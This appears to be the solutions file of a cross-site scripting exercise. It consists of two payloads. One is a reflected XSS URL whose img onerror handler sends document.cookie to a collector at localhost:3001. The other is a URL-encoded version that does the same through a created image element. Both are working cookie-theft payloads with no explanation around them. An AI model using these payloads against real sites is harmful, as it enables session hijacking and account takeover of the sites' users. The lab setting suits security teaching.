
# Solutions
1. ```http://localhost:3000/?q=<img src=x onerror=this.src='http://localhost:3001/cookie?data='+document.cookie;>```

2. ```
%3Cimg%20src%3Dx%20onerror%3D%22var%20img%20%3D%20document%2EcreateElement%28%27img%27%29%3B%20img%2Esrc%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fcookie%3Fdata%3D%27%20%2B%20document%2Ecookie%3B%22%3E
```
